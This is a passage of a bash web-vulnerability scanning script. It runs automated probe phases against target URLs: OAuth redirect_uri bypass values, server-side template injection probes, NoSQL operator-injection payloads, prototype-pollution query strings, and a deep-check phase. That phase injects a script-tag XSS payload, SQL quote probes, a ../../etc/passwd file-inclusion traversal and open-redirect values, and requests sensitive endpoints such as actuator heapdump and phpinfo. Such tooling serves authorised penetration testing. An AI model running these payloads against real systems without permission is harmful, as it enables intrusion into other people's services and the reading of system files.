    if have qsreplace && [ -s vulns/oauth/candidates.txt ]; then
        local bypass_values=(
            "https://${CALLBACK_DOMAIN}"
            "https://attacker.${CALLBACK_DOMAIN}"
            "//${CALLBACK_DOMAIN}"
            "javascript:alert(1)"
            "https://${TARGET}.${CALLBACK_DOMAIN}"
        )
        while read -r url; do
            [ -z "$url" ] && continue
            [[ "$url" != *redirect_uri=* ]] && continue
            for val in "${bypass_values[@]}"; do
                local test_url location code
                test_url=$(printf '%s' "$url" | sed -E "s#(redirect_uri=)[^&]*#\1${val//#/%23}#")
                code=$(curl_p -sk -o /dev/null --max-time 8 -A "$UA" "${c_hdrs[@]}" \
                    -w '%{http_code}' "$test_url" 2>/dev/null)
                location=$(curl_p -skI --max-time 8 -A "$UA" "${c_hdrs[@]}" "$test_url" 2>/dev/null \
                    | awk 'BEGIN{IGNORECASE=1} /^location:/ {sub(/^[^:]+:[[:space:]]*/, ""); print; exit}')
                if [ -n "$location" ] && printf '%s' "$location" | grep -q "$CALLBACK_DOMAIN"; then
                    printf 'OAUTH-REDIRECT-BYPASS\t%s\t%s\t%s\n' "$test_url" "$val" "$location" \
                        >> vulns/oauth/redirect_bypass.tsv
                fi
            done
        done < vulns/oauth/candidates.txt
    fi
    sort -u -o vulns/oauth/redirect_bypass.tsv vulns/oauth/redirect_bypass.tsv 2>/dev/null || true
    return 0
}

# ============ Phase: ssti_scan (NEW) ============
do_ssti_scan() {
    [ ! -s web/all_urls.txt ] && return 0
    have qsreplace || return 0
    mkdir -p vulns/ssti
    local c_hdrs
    mapfile -t c_hdrs < <(curl_headers)

    # Distinct arithmetic markers per engine — reflection of result proves eval
    local probes=(
        '{{7*7}}:49'
        '${{7*7}}:49'
        '<%= 7*7 %>:49'
        '${7*7}:49'
        '#{7*7}:49'
        '{{7*"7"}}:7777777'
        '{{9*9}}:81'
    )
    : > vulns/ssti/confirmed.tsv
    local target_set
    target_set=$(grep '=' web/all_urls.txt | head -100)

    log "SSTI probes"
    local entry payload expected test_url body
    for entry in "${probes[@]}"; do
        payload="${entry%%:*}"
        expected="${entry##*:}"
        while read -r url; do
            [ -z "$url" ] && continue
            test_url=$(printf '%s' "$url" | qsreplace "$payload")
            body=$(curl_p -skL --max-time "$HTTP_TIMEOUT" -A "$UA" "${c_hdrs[@]}" "$test_url" 2>/dev/null)
            printf '%s' "$body" | grep -Fq "$expected" \
                && printf 'SSTI\t%s\t%s\t%s\n' "$test_url" "$payload" "$expected" >> vulns/ssti/confirmed.tsv
        done <<< "$target_set"
    done
    sort -u -o vulns/ssti/confirmed.tsv vulns/ssti/confirmed.tsv 2>/dev/null || true
    return 0
}

# ============ Phase: nosql_scan (NEW) ============
do_nosql_scan() {
    [ ! -s web/all_urls.txt ] && return 0
    have qsreplace || return 0
    mkdir -p vulns/nosql
    local c_hdrs
    mapfile -t c_hdrs < <(curl_headers)

    local payloads=(
        "[\$ne]=x"
        "[\$gt]="
        "';return(true);//"
        "{\"\$ne\":null}"
    )
    : > vulns/nosql/candidates.tsv
    local target_set
    target_set=$(grep -Ei '(user|username|email|login|id|key|query|search)=' web/all_urls.txt | head -100)

    log "NoSQL probe (operator-injection)"
    local p
    for p in "${payloads[@]}"; do
        while read -r url; do
            [ -z "$url" ] && continue
            local test_url body orig_len new_len
            test_url=$(printf '%s' "$url" | qsreplace "$p")
            orig_len=$(curl_p -sk -o /dev/null -w '%{size_download}' --max-time 8 \
                -A "$UA" "${c_hdrs[@]}" "$url" 2>/dev/null)
            body=$(curl_p -skL --max-time 8 -A "$UA" "${c_hdrs[@]}" "$test_url" 2>/dev/null)
            new_len=$(printf '%s' "$body" | wc -c)
            # Big divergence or mongo-ish error markers
            if printf '%s' "$body" | grep -EiqI 'MongoError|CastError|ValidatorError|E11000'; then
                printf 'NOSQL-ERROR\t%s\t%s\n' "$test_url" "$p" >> vulns/nosql/candidates.tsv
            elif [ -n "$orig_len" ] && [ -n "$new_len" ] && [ "$orig_len" -gt 0 ] && \
                 [ $((new_len - orig_len)) -gt 500 ]; then
                printf 'NOSQL-SIZE-DIFF\t%s\t%s\t%d→%d\n' "$test_url" "$p" "$orig_len" "$new_len" \
                    >> vulns/nosql/candidates.tsv
            fi
        done <<< "$target_set"
    done
    sort -u -o vulns/nosql/candidates.tsv vulns/nosql/candidates.tsv 2>/dev/null || true
    return 0
}

# ============ Phase: proto_pollution_scan (NEW) ============
do_proto_pollution_scan() {
    [ ! -s web/all_urls.txt ] && return 0
    mkdir -p vulns/proto_pollution
    local c_hdrs
    mapfile -t c_hdrs < <(curl_headers)

    : > vulns/proto_pollution/candidates.tsv
    local canary="paintest_polluted_${RANDOM}"
    local targets
    targets=$(head -50 web/live_dedup.txt 2>/dev/null)
    [ -z "$targets" ] && return 0

    log "Client-side prototype-pollution reflection probe"
    while read -r url; do
        [ -z "$url" ] && continue
        local test_url body
        # Common client-side sink: query string merged into object
        test_url="${url%/}/?__proto__[${canary}]=polluted&constructor[prototype][${canary}]=polluted"
        body=$(curl_p -skL --max-time "$HTTP_TIMEOUT" -A "$UA" "${c_hdrs[@]}" "$test_url" 2>/dev/null)
        printf '%s' "$body" | grep -Fq "$canary" \
            && printf 'PROTO-POLLUTION-REFLECT\t%s\n' "$test_url" \
            >> vulns/proto_pollution/candidates.tsv
    done <<< "$targets"
    sort -u -o vulns/proto_pollution/candidates.tsv vulns/proto_pollution/candidates.tsv 2>/dev/null || true
    return 0
}

# ============ Phase: deep_checks ============
do_deep_checks() {
    [ "$DEEP_MODE" -ne 1 ] && return 0
    [ ! -s web/live_dedup.txt ] && return 0

    mkdir -p vulns/deep
    log "Deep validation checks"

    local -a curl_hdrs=(-A "$UA" -H "$ID_HEADER")
    [ -n "${AUTH_HEADER:-}" ] && curl_hdrs+=(-H "$AUTH_HEADER")
    [ -n "${AUTH_COOKIE:-}" ] && curl_hdrs+=(-H "Cookie: $AUTH_COOKIE")

    cat > tmp/deep_paths.txt <<'EOF'
/
/login
/admin
/administrator
/debug
/debug.php
/phpinfo.php
/info.php
/server-status
/actuator/env
/actuator/heapdump
/actuator/mappings
/actuator/beans
/graphql
/graphiql
/api/graphql
/playground
/dvwa/
/DVWA/
/setup.php
/security.php
/vulnerabilities/sqli/
/vulnerabilities/xss_r/
/vulnerabilities/xss_s/
/vulnerabilities/exec/
/vulnerabilities/fi/?page=../../../../../../etc/passwd
/mutillidae/
/index.php?page=login.php
/index.php?page=user-info.php
/WebGoat/
/WebGoat/login
/JuiceShop/
/ftp/
/administration
/api/Challenges
/rest/products/search?q=test
/rest/products/search?q=<script>alert(1337)</script>
EOF

    while read -r host; do
        [ -z "$host" ] && continue
        while read -r path; do
            printf '%s%s\n' "${host%/}" "$path"
        done < tmp/deep_paths.txt
    done < web/live_dedup.txt | sort -u > vulns/deep/deep_probe_urls.txt

    if have httpx; then
        local hx_hdrs
        mapfile -t hx_hdrs < <(httpx_hdrs)
        httpx_p -l vulns/deep/deep_probe_urls.txt -silent \
            -status-code -title -content-length -location -tech-detect \
            "${hx_hdrs[@]}" -rate-limit "$DEEP_RATE" \
            -o vulns/deep/deep_exposed_routes.txt 2>/dev/null
    fi

    local xss_payload='"><script>alert(1337)</script>'
    local sqli_payload="'"
    local lfi_payload='../../../../../../etc/passwd'
    local redirect_payload="https://${CALLBACK_DOMAIN}"

    if have qsreplace && [ -s web/all_urls.txt ]; then
        grep '=' web/all_urls.txt | head -200 | qsreplace "$xss_payload" \
            > tmp/deep_xss_payloads.txt 2>/dev/null
        while read -r url; do
            [ -z "$url" ] && continue
            curl_p -skL --max-time "$HTTP_TIMEOUT" "${curl_hdrs[@]}" "$url" 2>/dev/null \
                | grep -F "$xss_payload" >/dev/null && echo "$url" >> vulns/deep/reflected_xss_confirmed.txt
        done < tmp/deep_xss_payloads.txt

        grep '=' web/all_urls.txt | head -200 | qsreplace "$sqli_payload" \
            > tmp/deep_sqli_payloads.txt 2>/dev/null
        while read -r url; do
            [ -z "$url" ] && continue
            curl_p -skL --max-time "$HTTP_TIMEOUT" "${curl_hdrs[@]}" "$url" 2>/dev/null \
                | grep -Eiq 'SQL syntax|mysql_fetch|ORA-[0-9]|PostgreSQL|SQLite|ODBC|MariaDB|You have an error in your SQL' \
                && echo "$url" >> vulns/deep/sql_error_candidates.txt
        done < tmp/deep_sqli_payloads.txt

        grep -Ei '(file|path|page|include|template|view|doc|document|folder|root|dir)=' web/all_urls.txt \
            | head -150 | qsreplace "$lfi_payload" > tmp/deep_lfi_payloads.txt 2>/dev/null
        while read -r url; do
            [ -z "$url" ] && continue
            curl_p -skL --max-time "$HTTP_TIMEOUT" "${curl_hdrs[@]}" "$url" 2>/dev/null \
                | grep -E 'root:.*:0:0:|daemon:.*:1:1:' >/dev/null \
                && echo "$url" >> vulns/deep/lfi_confirmed.txt
        done < tmp/deep_lfi_payloads.txt

        grep -Ei '(url|next|redirect|return|continue|dest|destination|callback|to)=' web/all_urls.txt \
            | head -150 | qsreplace "$redirect_payload" > tmp/deep_redirect_payloads.txt 2>/dev/null
        while read -r url; do
            [ -z "$url" ] && continue
            curl_p -skI --max-time "$HTTP_TIMEOUT" "${curl_hdrs[@]}" "$url" 2>/dev/null \
                | grep -qi "^location: ${redirect_payload}" \
                && echo "$url" >> vulns/deep/open_redirect_confirmed.txt
        done < tmp/deep_redirect_payloads.txt
    fi

    while read -r url; do
        [ -z "$url" ] && continue
        curl_p -skL --max-time "$HTTP_TIMEOUT" "${curl_hdrs[@]}" "$url" 2>/dev/null \
            | grep -E 'root:.*:0:0:|daemon:.*:1:1:' >/dev/null \
            && echo "$url" >> vulns/deep/lfi_confirmed.txt
    done < <(grep 'passwd' vulns/deep/deep_probe_urls.txt 2>/dev/null)

    sort -u -o vulns/deep/reflected_xss_confirmed.txt vulns/deep/reflected_xss_confirmed.txt 2>/dev/null || true
    sort -u -o vulns/deep/sql_error_candidates.txt vulns/deep/sql_error_candidates.txt 2>/dev/null || true
    sort -u -o vulns/deep/lfi_confirmed.txt vulns/deep/lfi_confirmed.txt 2>/dev/null || true
    sort -u -o vulns/deep/open_redirect_confirmed.txt vulns/deep/open_redirect_confirmed.txt 2>/dev/null || true

    {
        echo "# Deep Validation Findings"
        echo
        echo "- Exposed interesting routes: $(wc -l < vulns/deep/deep_exposed_routes.txt 2>/dev/null || echo 0)"
        echo "- Reflected XSS confirmed: $(wc -l < vulns/deep/reflected_xss_confirmed.txt 2>/dev/null || echo 0)"
        echo "- SQL error candidates: $(wc -l < vulns/deep/sql_error_candidates.txt 2>/dev/null || echo 0)"
        echo "- LFI confirmed: $(wc -l < vulns/deep/lfi_confirmed.txt 2>/dev/null || echo 0)"
        echo "- Open redirects confirmed: $(wc -l < vulns/deep/open_redirect_confirmed.txt 2>/dev/null || echo 0)"
    } > vulns/deep/summary.md

    return 0
}
